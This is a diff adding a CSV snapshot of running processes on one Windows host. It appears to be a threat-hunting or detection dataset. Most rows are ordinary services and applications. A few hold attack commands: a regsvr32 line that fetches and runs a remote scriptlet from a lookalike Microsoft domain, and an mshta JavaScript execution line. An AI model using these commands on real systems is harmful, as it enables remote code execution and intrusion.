@@ -1,0 +1,138 @@
+,arguments,hostname,name,path,pid,username
+0,C:\Windows\system32\svchost.exe -k LocalService -p,0005JOFSS,svchost.exe,C:\Windows\system32,2152,NT AUTHORITY\SYSTEM
+1,c:\windows\system32\svchost.exe -k netsvcs -p -s TokenBroker,0005JOFSS,svchost.exe,c:\windows\system32,3772,NT AUTHORITY\SYSTEM
+2,c:\windows\system32\svchost.exe -k unistacksvcgroup -s WpnUserService,0005JOFSS,svchost.exe,c:\windows\system32,212,NT AUTHORITY\SYSTEM
+3,c:\windows\system32\svchost.exe -k networkservice -p -s NlaSvc,0005JOFSS,svchost.exe,c:\windows\system32,4008,NT AUTHORITY\SYSTEM
+4,c:\windows\system32\svchost.exe -k netsvcs -p,0005JOFSS,svchost.exe,c:\windows\system32,1608,NT AUTHORITY\SYSTEM
+5,c:\windows\system32\svchost.exe -k netsvcs -p -s BITS,0005JOFSS,svchost.exe,c:\windows\system32,3416,NT AUTHORITY\SYSTEM
+6,c:\windows\system32\svchost.exe -k networkservice -p -s CryptSvc,0005JOFSS,svchost.exe,c:\windows\system32,2820,NT AUTHORITY\SYSTEM
+7,c:\windows\system32\svchost.exe -k networkservice -p -s LanmanWorkstation,0005JOFSS,svchost.exe,c:\windows\system32,6020,NT AUTHORITY\SYSTEM
+8,,0005JOFSS,System,,2740,NT AUTHORITY\SYSTEM
+9,C:\Windows\System32\RuntimeBroker.exe -Embedding,0005JOFSS,RuntimeBroker.exe,C:\Windows\System32,3476,NT AUTHORITY\SYSTEM
+10,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",0005JOFSS,McApExe.exe,C:\Program Files\Common Files\McAfee\VSCore_18_6,3580,emil.benne
+11,c:\windows\system32\svchost.exe -k localserviceandnoimpersonation -p -s SSDPSRV,0005JOFSS,svchost.exe,c:\windows\system32,2456,NT AUTHORITY\SYSTEM
+12,C:\Windows\system32\svchost.exe -k SDRSVC,0005JOFSS,svchost.exe,C:\Windows\system32,3260,NT AUTHORITY\SYSTEM
+13,c:\windows\system32\svchost.exe -k localservice -p -s LicenseManager,0005JOFSS,svchost.exe,c:\windows\system32,1284,NT AUTHORITY\SYSTEM
+14,C:\Windows\system32\BtwRSupportService.exe,0005JOFSS,BtwRSupportService.exe,C:\Windows\system32,3940,NT AUTHORITY\SYSTEM
+15,C:\Windows\system32\lsass.exe,0005JOFSS,lsass.exe,C:\Windows\system32,680,NT AUTHORITY\SYSTEM
+16,"""C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy\LockApp.exe"" -ServerName:WindowsDefaultLockScreen.AppX7y4nbzq37zn4ks9k7amqjywdat7d3j2z.mca",0005JOFSS,LockApp.exe,C:\Windows\SystemApps\Microsoft.LockApp_cw5n1h2txyewy,1476,NT AUTHORITY\SYSTEM
+17,c:\windows\system32\svchost.exe -k networkservice -p -s TapiSrv,0005JOFSS,svchost.exe,c:\windows\system32,6068,NT AUTHORITY\SYSTEM
+18,C:\Windows\System32\mshta.exe javascript:a=(GetObject('script:#fileurl')).Exec();close();,0005JOFSS,mshta.exe,C:\Windows\System32\mshta.exe,1296,NT AUTHORITY\SYSTEM
+19,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",0005JOFSS,MMSSHOST.EXE,C:\Program Files\Common Files\McAfee\MMSSHost,1488,emil.benne
+20,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,0005JOFSS,ModuleCoreService.exe,c:\program files\common files\mcafee\modulecore,2072,emil.benne
+21,"""ctfmon.exe""",0005JOFSS,ctfmon.exe,C:\Windows\system32,536,NT AUTHORITY\SYSTEM
+22,,0005JOFSS,SecurityHealthService.exe,,648,NT AUTHORITY\SYSTEM
+23,c:\windows\system32\svchost.exe -k netsvcs -p -s LanmanServer,0005JOFSS,svchost.exe,c:\windows\system32,4856,NT AUTHORITY\SYSTEM
+24,"""fontdrvhost.exe""",0005JOFSS,fontdrvhost.exe,C:\Windows\System32,2356,NT AUTHORITY\SYSTEM
+25,c:\windows\system32\svchost.exe -k dcomlaunch -p -s LSM,0005JOFSS,svchost.exe,c:\windows\system32,5808,NT AUTHORITY\SYSTEM
+26,c:\windows\system32\svchost.exe -k dcomlaunch -p -s PlugPlay,0005JOFSS,svchost.exe,c:\windows\system32,2396,NT AUTHORITY\SYSTEM
+27,C:\Windows\system32\svchost.exe -k DcomLaunch -p,0005JOFSS,svchost.exe,C:\Windows\system32,4668,NT AUTHORITY\SYSTEM
+28,C:\Windows\system32\ApplicationFrameHost.exe -Embedding,0005JOFSS,ApplicationFrameHost.exe,C:\Windows\system32,492,NT AUTHORITY\SYSTEM
+29,c:\windows\system32\svchost.exe -k netsvcs -p -s iphlpsvc,0005JOFSS,svchost.exe,c:\windows\system32,1256,NT AUTHORITY\SYSTEM
+30,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",0005JOFSS,PEFService.exe,C:\Program Files\Common Files\McAfee\PEF\CORE,502,emil.benne
+32,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=12376823585177401963 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=12376823585177401963 --renderer-client-id=7 --mojo-platform-channel-handle=2368 /prefetch:1",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,4807,martha.hay
+33,,0005JOFSS,svchost.exe,,1304,NT AUTHORITY\SYSTEM
+34,c:\windows\system32\svchost.exe -k localservice -p -s CDPSvc,0005JOFSS,svchost.exe,c:\windows\system32,2460,NT AUTHORITY\SYSTEM
+35,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s Dhcp,0005JOFSS,svchost.exe,c:\windows\system32,3776,NT AUTHORITY\SYSTEM
+37,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --start-maximized --ran-launcher",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,2673,martha.hay
+38,C:\Windows\system32\svchost.exe -k imgsvc,0005JOFSS,svchost.exe,C:\Windows\system32,2860,NT AUTHORITY\SYSTEM
+39,,0005JOFSS,SgrmBroker.exe,,3788,NT AUTHORITY\SYSTEM
+40,"""C:\Users\emil.benne\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",0005JOFSS,OneDrive.exe,C:\Users\emil.benne\AppData\Local\Microsoft\OneDrive,4240,emil.benne
+41,"""fontdrvhost.exe""",0005JOFSS,fontdrvhost.exe,C:\Windows\system32,2184,NT AUTHORITY\SYSTEM
+42,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork -p,0005JOFSS,svchost.exe,C:\Windows\system32,3192,NT AUTHORITY\SYSTEM
+43,c:\windows\system32\svchost.exe -k localservicenonetwork -p -s DPS,0005JOFSS,svchost.exe,c:\windows\system32,2092,NT AUTHORITY\SYSTEM
+44,c:\windows\system32\svchost.exe -k localservice -p -s bthserv,0005JOFSS,svchost.exe,c:\windows\system32,6316,NT AUTHORITY\SYSTEM
+45,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=16451249972883912486 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=16451249972883912486 --renderer-client-id=4 --mojo-platform-channel-handle=3140 /prefetch:1",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,499,martha.hay
+46,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",0005JOFSS,mcshield.exe,C:\Program Files\Common Files\McAfee\AMCore,2693,emil.benne
+47,,0005JOFSS,wininit.exe,,700,NT AUTHORITY\SYSTEM
+48,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",0005JOFSS,MFEAvSvc.exe,C:\Program Files\McAfee\MfeAV,467,emil.benne
+49,c:\windows\system32\svchost.exe -k localservice -p -s EventSystem,0005JOFSS,svchost.exe,c:\windows\system32,5672,NT AUTHORITY\SYSTEM
+51,c:\windows\system32\svchost.exe -k appmodel -p -s StateRepository,0005JOFSS,svchost.exe,c:\windows\system32,5376,NT AUTHORITY\SYSTEM
+52,c:\windows\system32\svchost.exe -k localservice -p -s nsi,0005JOFSS,svchost.exe,c:\windows\system32,4,NT AUTHORITY\SYSTEM
+53,,0005JOFSS,smss.exe,,4156,NT AUTHORITY\SYSTEM
+55,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s PcaSvc,0005JOFSS,svchost.exe,c:\windows\system32,2276,NT AUTHORITY\SYSTEM
+56,C:\Windows\System32\WinLogon.exe -SpecialSession,0005JOFSS,WinLogon.exe,C:\Windows\System32,5696,NT AUTHORITY\SYSTEM
+57,,0005JOFSS,MsMpEng.exe,,5304,NT AUTHORITY\SYSTEM
+58,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s EventLog,0005JOFSS,svchost.exe,c:\windows\system32,1664,NT AUTHORITY\SYSTEM
+60,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",0005JOFSS,McCSPServiceHost.exe,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,3467,emil.benne
+61,"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",0005JOFSS,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,4312,emil.benne
+64,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",0005JOFSS,McPvTray.exe,C:\Program Files\McAfee\MAT,1619,emil.benne
+65,C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F},0005JOFSS,DllHost.exe,C:\Windows\system32,4456,NT AUTHORITY\SYSTEM
+66,c:\windows\system32\svchost.exe -k localservice -p -s FontCache,0005JOFSS,svchost.exe,c:\windows\system32,780,NT AUTHORITY\SYSTEM
+67,C:\Windows\System32\spoolsv.exe,0005JOFSS,spoolsv.exe,C:\Windows\System32,5384,NT AUTHORITY\SYSTEM
+68,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TrkWks,0005JOFSS,svchost.exe,c:\windows\system32,4428,NT AUTHORITY\SYSTEM
+69,c:\windows\system32\svchost.exe -k localservice -p -s SstpSvc,0005JOFSS,svchost.exe,c:\windows\system32,936,NT AUTHORITY\SYSTEM
+72,c:\windows\system32\svchost.exe -k rpcss -p,0005JOFSS,svchost.exe,c:\windows\system32,2780,NT AUTHORITY\SYSTEM
+73,c:\windows\system32\svchost.exe -k localservice -p -s WebClient,0005JOFSS,svchost.exe,c:\windows\system32,5944,NT AUTHORITY\SYSTEM
+74,"""dwm.exe""",0005JOFSS,dwm.exe,C:\Windows\System32,4112,NT AUTHORITY\SYSTEM
+75,c:\windows\system32\svchost.exe -k localservice -p -s netprofm,0005JOFSS,svchost.exe,c:\windows\system32,84,NT AUTHORITY\SYSTEM
+76,c:\windows\system32\svchost.exe -k netsvcs,0005JOFSS,svchost.exe,c:\windows\system32,4732,NT AUTHORITY\SYSTEM
+77,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s NcbService,0005JOFSS,svchost.exe,c:\windows\system32,5960,NT AUTHORITY\SYSTEM
+78,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s StorSvc,0005JOFSS,svchost.exe,c:\windows\system32,32,NT AUTHORITY\SYSTEM
+80,c:\windows\system32\svchost.exe -k unistacksvcgroup,0005JOFSS,svchost.exe,c:\windows\system32,112,NT AUTHORITY\SYSTEM
+81,C:\Windows\System32\svchost.exe -k utcsvc -p,0005JOFSS,svchost.exe,C:\Windows\System32,2600,NT AUTHORITY\SYSTEM
+82,c:\windows\system32\svchost.exe -k netsvcs -p -s ShellHWDetection,0005JOFSS,svchost.exe,c:\windows\system32,1948,NT AUTHORITY\SYSTEM
+83,c:\windows\system32\svchost.exe -k localservice -p -s BthAvctpSvc,0005JOFSS,svchost.exe,c:\windows\system32,4584,NT AUTHORITY\SYSTEM
+86,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SensorService,0005JOFSS,svchost.exe,c:\windows\system32,5852,NT AUTHORITY\SYSTEM
+88,C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p,0005JOFSS,svchost.exe,C:\Windows\system32,2104,NT AUTHORITY\SYSTEM
+89,"""C:\Windows\system32\SearchFilterHost.exe"" 0 736 740 748 8192 744 ",0005JOFSS,SearchFilterHost.exe,C:\Windows\system32,6044,NT AUTHORITY\SYSTEM
+90,"""C:\Users\popbaile\AppData\Local\GoToMeeting\9508\g2mstart.exe"" ""/Action Host"" ""/BrokerServiceSuffix @ISL1"" ""/Build 9508"" ""/Download Auto"" ""/EGWAddress 216.115.208.230"" ""/EGWDNS egwglobal.gotomeeting.com"" ""/EGWPort 80 443 8200"" ""/Mode Normal"" ""/Product g2m"" ""/colClientUiReadyEvent Global\55848945-2CEA-4978-BF24-0C6A3B11E66E"" ""/sessionTrackingId e0-PH0LsK8MFgg2A9ZkKW16jt2JkQ4bP""",0005JOFSS,g2mstart.exe,C:\Users\popbaile\AppData\Local\GoToMeeting\9508,1001,popbaile
+91,"C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera_crashreporter.exe --type=crashpad-handler /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler ""--database=C:\Users\martha.hay\AppData\Roaming\Opera Software\Opera Stable\Crash Reports"" ""--crash-count-file=C:\Users\martha.hay\AppData\Roaming\Opera Software\Opera Stable\crash_count.txt"" --url=https://crashstats-collector.opera.com/collector/submit --annotation=channel=Stable --annotation=plat=Win64 --annotation=prod=OperaDesktop --annotation=ver=56.0.3051.52 --initial-client-data=0x238 0x304 0x30c 0x320 0x308 0x7ffb51313108 0x7ffb51313118 0x7ffb51313128",0005JOFSS,opera_crashreporter.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,1401,martha.hay
+92,c:\windows\system32\svchost.exe -k netsvcs -p -s lfsvc,0005JOFSS,svchost.exe,c:\windows\system32,6004,NT AUTHORITY\SYSTEM
+93,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",0005JOFSS,mchost.exe,C:\Program Files\Common Files\McAfee\Platform\Core,2844,emil.benne
+94,c:\windows\system32\svchost.exe -k netsvcs -p -s UserManager,0005JOFSS,svchost.exe,c:\windows\system32,12,NT AUTHORITY\SYSTEM
+95,C:\Windows\Explorer.EXE,0005JOFSS,Explorer.EXE,C:\Windows,3912,NT AUTHORITY\SYSTEM
+96,,0005JOFSS,Registry,,2680,NT AUTHORITY\SYSTEM
+97,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},0005JOFSS,taskhostw.exe,c:\windows\system32,2264,NT AUTHORITY\SYSTEM
+98,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DeviceAssociationService,0005JOFSS,svchost.exe,c:\windows\system32,4136,NT AUTHORITY\SYSTEM
+99,,0005JOFSS,DisplaySwitch.exe,C:\Windows\System32\DisplaySwitch.exe,544,NT AUTHORITY\SYSTEM
+100,sihost.exe,0005JOFSS,sihost.exe,c:\windows\system32,1160,NT AUTHORITY\SYSTEM
+102,c:\windows\system32\svchost.exe -k netsvcs -p -s Themes,0005JOFSS,svchost.exe,c:\windows\system32,6164,NT AUTHORITY\SYSTEM
+104,"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",0005JOFSS,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,1692,NT AUTHORITY\SYSTEM
+105,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",0005JOFSS,McAMTaskAgent.exe,C:\Program Files\Common Files\McAfee\TaskScheduler,3406,emil.benne
+106,"""C:\Users\emil.benne\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",0005JOFSS,mcafee_trial_setup_433.0207.3919_key.exe,C:\Users\emil.benne\AppData\Local\Temp\scoped_dir9616_4071,1196,emil.benne
+108,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",0005JOFSS,ProtectedModuleHost.exe,C:\Program Files\Common Files\McAfee\ModuleCore,228,emil.benne
+109,"""C:\Users\popbaile\AppData\Local\GoToMeeting\9508\g2mcomm.exe"" ""Action=Host&amp;BrokerServiceSuffix=@ISL1&amp;Build=9508&amp;colClientUiReadyEvent=Global\55848945-2CEA-4978-BF24-0C6A3B11E66E&amp;Digest=1bc982ef0552b1fb859a423b1f290ef0&amp;Dir=C:\Users\popbaile\AppData\Local\GoToMeeting\9508\&amp;Download=Auto&amp;EGWAddress=216.115.208.230&amp;EGWDNS=egwglobal.gotomeeting.com&amp;EGWPort=80 443 8200&amp;LoaderPath=C:\Users\popbaile\AppData\Local\GoToMeeting\9508\g2mstart.exe&amp;LogName=c:\users\popbaile\appdata\local\temp\logmeinlogs\gotomeeting\9508\2018-10-29_12.04.18.379\GoToMeeting.log&amp;Mode=Normal&amp;Path=g2mlauncher.exe&amp;Plugin=G2MLauncher&amp;Product=g2m&amp;sessionTrackingId=e0-PH0LsK8MFgg2A9ZkKW16jt2JkQ4bP&amp;UniqueId=16cc""",0005JOFSS,g2mcomm.exe,C:\Users\popbaile\AppData\Local\GoToMeeting\9508,5825,popbaile
+111,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p,0005JOFSS,svchost.exe,C:\Windows\System32,2432,NT AUTHORITY\SYSTEM
+112,"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",0005JOFSS,vmware-authd.exe,C:\Program Files (x86)\VMware\VMware Player,3121,emil.benne
+116,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,0005JOFSS,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack,1563,emil.benne
+117,,0005JOFSS,NisSrv.exe,,2128,NT AUTHORITY\SYSTEM
+122,C:\Windows\system32\SearchIndexer.exe /Embedding,0005JOFSS,SearchIndexer.exe,C:\Windows\system32,5712,NT AUTHORITY\SYSTEM
+124,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s SysMain,0005JOFSS,svchost.exe,c:\windows\system32,4912,NT AUTHORITY\SYSTEM
+133,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s AudioEndpointBuilder,0005JOFSS,svchost.exe,c:\windows\system32,4196,NT AUTHORITY\SYSTEM
+136,\??\C:\Windows\system32\conhost.exe 0x4,0005JOFSS,conhost.exe,C:\Windows\system32,4116,NT AUTHORITY\SYSTEM
+137,c:\windows\system32\svchost.exe -k netsvcs -p -s Appinfo,0005JOFSS,svchost.exe,c:\windows\system32,2144,NT AUTHORITY\SYSTEM
+138,c:\windows\system32\svchost.exe -k netsvcs -p -s ProfSvc,0005JOFSS,svchost.exe,c:\windows\system32,604,NT AUTHORITY\SYSTEM
+139,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",0005JOFSS,McDiReg.exe,C:\ProgramData\McAfee\Direct,4880,emil.benne
+140,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s DsSvc,0005JOFSS,svchost.exe,c:\windows\system32,1528,NT AUTHORITY\SYSTEM
+141,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=gpu-process --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --gpu-preferences=KAAAAAAAAACAAwBAAQAAAAAAAAAAAGAAAAAAAAAAAAAIAAAAAAAAACgAAAAEAAAAIAAAAAAAAAAoAAAAAAAAADAAAAAAAAAAOAAAAAAAAAAQAAAAAAAAAAAAAAAKAAAAEAAAAAAAAAAAAAAACwAAABAAAAAAAAAAAQAAAAoAAAAQAAAAAAAAAAEAAAALAAAA --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --service-request-channel-token=7207758415534163028 --mojo-platform-channel-handle=1472 --ignored="" --type=renderer "" /prefetch:2",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,1140,martha.hay
+142,"""C:\Program Files (x86)\Common Files\Java\Java Update\jusched.exe"" ",0005JOFSS,jusched.exe,C:\Program Files (x86)\Common Files\Java\Java Update,1288,NT AUTHORITY\SYSTEM
+144,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s WinHttpAutoProxySvc,0005JOFSS,svchost.exe,c:\windows\system32,3380,NT AUTHORITY\SYSTEM
+145,c:\windows\system32\svchost.exe -k netsvcs -p -s Schedule,0005JOFSS,svchost.exe,c:\windows\system32,5620,NT AUTHORITY\SYSTEM
+149,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",0005JOFSS,modulecoreservice.exe,c:\program files\common files\mcafee\modulecore,825,emil.benne
+152,c:\windows\system32\svchost.exe -k networkservice -p -s Dnscache,0005JOFSS,svchost.exe,c:\windows\system32,6156,NT AUTHORITY\SYSTEM
+153,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",0005JOFSS,UIHost.exe,C:\Program Files\McAfee\WebAdvisor,274,emil.benne
+154,c:\windows\system32\svchost.exe -k netsvcs -p -s SENS,0005JOFSS,svchost.exe,c:\windows\system32,5264,NT AUTHORITY\SYSTEM
+156,c:\windows\system32\svchost.exe -k netsvcs -p -s WpnService,0005JOFSS,svchost.exe,c:\windows\system32,5768,NT AUTHORITY\SYSTEM
+158,,0005JOFSS,Memory Compression,,3236,NT AUTHORITY\SYSTEM
+159,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s wscsvc,0005JOFSS,svchost.exe,c:\windows\system32,2704,NT AUTHORITY\SYSTEM
+163,,0005JOFSS,csrss.exe,,1768,NT AUTHORITY\SYSTEM
+167,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p -s lmhosts,0005JOFSS,svchost.exe,C:\Windows\System32,6368,NT AUTHORITY\SYSTEM
+174,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",0005JOFSS,ServiceHost.exe,C:\Program Files\McAfee\WebAdvisor,2315,emil.benne
+176,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",0005JOFSS,mcuicnt.exe,C:\Program Files\Common Files\mcafee\Platform,1844,emil.benne
+177,C:\Windows\System32\regsvr32 /u /n /s /i:http://www.Micro-soft.me/paywdfmgload.sct scrobj.dll,0005JOFSS,wscript.exe,C:\Windows\System32\wscript.exe,4360,popbaile
+184,C:\Windows\system32\SettingSyncHost.exe -Embedding,0005JOFSS,SettingSyncHost.exe,C:\Windows\system32,172,NT AUTHORITY\SYSTEM
+185,C:\Windows\System32\svchost.exe -k NetworkService -p -s DoSvc,0005JOFSS,svchost.exe,C:\Windows\System32,436,NT AUTHORITY\SYSTEM
+190,C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,0005JOFSS,svchost.exe,C:\Windows\system32,4928,NT AUTHORITY\SYSTEM
+191,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=2685998191293934672 --lang=en-GB --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=2685998191293934672 --renderer-client-id=12 --mojo-platform-channel-handle=4360 /prefetch:1",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,4137,martha.hay
+194,"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",0005JOFSS,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,6320,NT AUTHORITY\SYSTEM
+195,,0005JOFSS,services.exe,,3108,NT AUTHORITY\SYSTEM
+201,c:\windows\system32\svchost.exe -k unistacksvcgroup -s CDPUserSvc,0005JOFSS,svchost.exe,c:\windows\system32,6328,NT AUTHORITY\SYSTEM
+208,c:\windows\system32\svchost.exe -k localservice -p -s WdiServiceHost,0005JOFSS,svchost.exe,c:\windows\system32,5924,NT AUTHORITY\SYSTEM
+211,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,0005JOFSS,McDiReg.exe,C:\ProgramData\McAfee\Direct,2865,emil.benne
+222,c:\windows\system32\svchost.exe -k localsystemnetworkrestricted -p -s TabletInputService,0005JOFSS,svchost.exe,c:\windows\system32,88,NT AUTHORITY\SYSTEM
+223,"""C:\Windows\system32\cmd.exe"" ",0005JOFSS,cmd.exe,C:\Windows\system32,6497,martha.hay
+231,"""C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52\opera.exe"" --type=renderer --field-trial-handle=1640 14609910000652164441 9538679763400238678 131072 --service-pipe-token=6930244878569528683 --lang=en-GB --extension-process --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --with-feature:installer-experiment-test=off --with-feature:installer-use-minimal-package=off --with-feature:installer-simplified-ui=on --ab_tests=DNA-70598-test:DNA-70598 --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --service-request-channel-token=6930244878569528683 --renderer-client-id=3 --mojo-platform-channel-handle=2904 /prefetch:1",0005JOFSS,opera.exe,C:\Users\martha.hay\AppData\Local\Programs\Opera\56.0.3051.52,5070,martha.hay
+237,c:\windows\system32\svchost.exe -k netsvcs -p -s Winmgmt,0005JOFSS,svchost.exe,c:\windows\system32,2028,NT AUTHORITY\SYSTEM
+244,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -s BTAGService,0005JOFSS,svchost.exe,c:\windows\system32,6224,NT AUTHORITY\SYSTEM
+265,c:\windows\system32\svchost.exe -k localservicenetworkrestricted -p -s TimeBrokerSvc,0005JOFSS,svchost.exe,c:\windows\system32,4864,NT AUTHORITY\SYSTEM
